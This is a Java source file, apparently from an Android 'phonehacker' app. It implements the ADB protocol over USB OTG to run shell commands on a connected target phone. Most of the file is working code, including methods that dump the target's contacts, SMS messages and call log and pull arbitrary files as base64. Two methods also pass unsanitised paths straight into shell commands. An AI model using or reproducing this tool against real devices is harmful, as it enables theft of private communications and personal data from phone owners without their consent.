package com.offensive.phonehacker;

import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbDeviceConnection;
import android.hardware.usb.UsbEndpoint;
import android.hardware.usb.UsbInterface;
import android.hardware.usb.UsbManager;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

/**
 * ADB Protocol Helper for USB OTG communication
 * Implements the ADB protocol for executing commands on connected Android devices
 */
public class AdbHelper {
    private static final String TAG = "AdbHelper";
    
    // ADB Protocol Constants
    private static final int ADB_CLASS = 0xff;
    private static final int ADB_SUBCLASS = 0x42;
    private static final int ADB_PROTOCOL = 0x01;
    
    // ADB Message Types
    private static final int A_SYNC = 0x434e5953;
    private static final int A_CNXN = 0x4e584e43;
    private static final int A_OPEN = 0x4e45504f;
    private static final int A_OKAY = 0x59414b4f;
    private static final int A_CLSE = 0x45534c43;
    private static final int A_WRTE = 0x45545257;
    private static final int A_AUTH = 0x48545541;
    
    private static final int ADB_VERSION = 0x01000000;
    private static final int MAX_PAYLOAD = 4096;
    private static final int TIMEOUT_MS = 5000;
    
    private UsbManager usbManager;
    private UsbDevice device;
    private UsbDeviceConnection connection;
    private UsbInterface adbInterface;
    private UsbEndpoint endpointIn;
    private UsbEndpoint endpointOut;
    private int localId = 1;
    private boolean connected = false;
    
    public AdbHelper(UsbManager usbManager) {
        this.usbManager = usbManager;
    }
    
    public boolean connect(UsbDevice device) throws Exception {
        this.device = device;
        
        // Find ADB interface (class 0xff, subclass 0x42, protocol 0x01)
        for (int i = 0; i < device.getInterfaceCount(); i++) {
            UsbInterface iface = device.getInterface(i);
            if (iface.getInterfaceClass() == ADB_CLASS &&
                iface.getInterfaceSubclass() == ADB_SUBCLASS &&
                iface.getInterfaceProtocol() == ADB_PROTOCOL) {
                adbInterface = iface;
                break;
            }
        }
        
        if (adbInterface == null) {
            throw new Exception("No ADB interface found - ensure USB debugging is enabled on target");
        }
        
        // Find bulk endpoints
        for (int i = 0; i < adbInterface.getEndpointCount(); i++) {
            UsbEndpoint ep = adbInterface.getEndpoint(i);
            if (ep.getType() == android.hardware.usb.UsbConstants.USB_ENDPOINT_XFER_BULK) {
                if (ep.getDirection() == android.hardware.usb.UsbConstants.USB_DIR_IN) {
                    endpointIn = ep;
                } else {
                    endpointOut = ep;
                }
            }
        }
        
        if (endpointIn == null || endpointOut == null) {
            throw new Exception("Could not find ADB bulk endpoints");
        }
        
        connection = usbManager.openDevice(device);
        if (connection == null) {
            throw new Exception("Could not open USB connection - permission denied?");
        }
        
        if (!connection.claimInterface(adbInterface, true)) {
            throw new Exception("Could not claim ADB interface");
        }
        
        connected = sendConnect();
        return connected;
    }
    
    private boolean sendConnect() throws Exception {
        String identity = "host::features=shell_v2,cmd,stat_v2";
        byte[] identityBytes = (identity + "\0").getBytes("UTF-8");
        
        sendMessage(A_CNXN, ADB_VERSION, MAX_PAYLOAD, identityBytes);
        
        AdbMessage response = receiveMessage(TIMEOUT_MS);
        if (response != null && response.command == A_CNXN) {
            Log.i(TAG, "ADB connected to: " + new String(response.data));
            return true;
        } else if (response != null && response.command == A_AUTH) {
            Log.w(TAG, "Device requires authentication - accept USB debugging prompt on target");
            return false;
        }
        return false;
    }
    
    public String executeCommand(String command) throws Exception {
        if (!connected) {
            throw new Exception("Not connected to device");
        }
        
        int lid = localId++;
        String destination = "shell:" + command + "\0";
        
        sendMessage(A_OPEN, lid, 0, destination.getBytes("UTF-8"));
        
        AdbMessage response = receiveMessage(TIMEOUT_MS);
        if (response == null || response.command != A_OKAY) {
            throw new Exception("Failed to open shell - got: " + 
                (response != null ? Integer.toHexString(response.command) : "null"));
        }
        
        int remoteId = response.arg0;
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        
        long startTime = System.currentTimeMillis();
        while (System.currentTimeMillis() - startTime < 30000) {
            response = receiveMessage(1000);
            if (response == null) continue;
            
            if (response.command == A_WRTE && response.data != null) {
                output.write(response.data);
                sendMessage(A_OKAY, lid, remoteId, null);
            } else if (response.command == A_CLSE) {
                break;
            }
        }
        
        sendMessage(A_CLSE, lid, remoteId, null);
        return output.toString("UTF-8");
    }
    
    public String getDeviceInfo() throws Exception {
        StringBuilder info = new StringBuilder();
        info.append(executeCommand("getprop ro.product.model")).append("\n");
        info.append("Android: ").append(executeCommand("getprop ro.build.version.release")).append("\n");
        info.append("Build: ").append(executeCommand("getprop ro.build.display.id")).append("\n");
        info.append("Root: ").append(executeCommand("which su"));
        return info.toString().trim();
    }
    
    public boolean isRooted() throws Exception {
        String result = executeCommand("which su");
        return result != null && result.contains("/su");
    }
    
    public String dumpContacts() throws Exception {
        return executeCommand("content query --uri content://contacts/phones");
    }
    
    public String dumpSms() throws Exception {
        return executeCommand("content query --uri content://sms");
    }
    
    public String dumpCallLog() throws Exception {
        return executeCommand("content query --uri content://call_log/calls");
    }
    
    public String listFiles(String path) throws Exception {
        return executeCommand("ls -la " + path);
    }
    
    public String pullFile(String remotePath) throws Exception {
        return executeCommand("cat " + remotePath + " | base64");
    }
    
    private void sendMessage(int command, int arg0, int arg1, byte[] data) throws Exception {
        int dataLength = (data != null) ? data.length : 0;
        int dataChecksum = 0;
        if (data != null) {
            for (byte b : data) {
                dataChecksum += (b & 0xff);
            }
        }
        
        ByteBuffer header = ByteBuffer.allocate(24);
        header.order(ByteOrder.LITTLE_ENDIAN);
        header.putInt(command);
        header.putInt(arg0);
        header.putInt(arg1);
        header.putInt(dataLength);
        header.putInt(dataChecksum);
        header.putInt(command ^ 0xffffffff);
        
        connection.bulkTransfer(endpointOut, header.array(), 24, TIMEOUT_MS);
        
        if (data != null && data.length > 0) {
            connection.bulkTransfer(endpointOut, data, data.length, TIMEOUT_MS);
        }
    }
    
    private AdbMessage receiveMessage(int timeout) {
        try {
            byte[] header = new byte[24];
            int received = connection.bulkTransfer(endpointIn, header, 24, timeout);
            if (received != 24) return null;
            
            ByteBuffer buf = ByteBuffer.wrap(header);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            
            AdbMessage msg = new AdbMessage();
            msg.command = buf.getInt();
            msg.arg0 = buf.getInt();
            msg.arg1 = buf.getInt();
            int dataLength = buf.getInt();
            msg.checksum = buf.getInt();
            msg.magic = buf.getInt();
            
            if (dataLength > 0 && dataLength <= MAX_PAYLOAD) {
                msg.data = new byte[dataLength];
                connection.bulkTransfer(endpointIn, msg.data, dataLength, timeout);
            }
            
            return msg;
        } catch (Exception e) {
            Log.e(TAG, "Error receiving message: " + e.getMessage());
            return null;
        }
    }
    
    public void disconnect() {
        if (connection != null) {
            if (adbInterface != null) {
                connection.releaseInterface(adbInterface);
            }
            connection.close();
        }
        connected = false;
    }
    
    public boolean isConnected() {
        return connected;
    }
    
    private static class AdbMessage {
        int command;
        int arg0;
        int arg1;
        int checksum;
        int magic;
        byte[] data;
    }
}
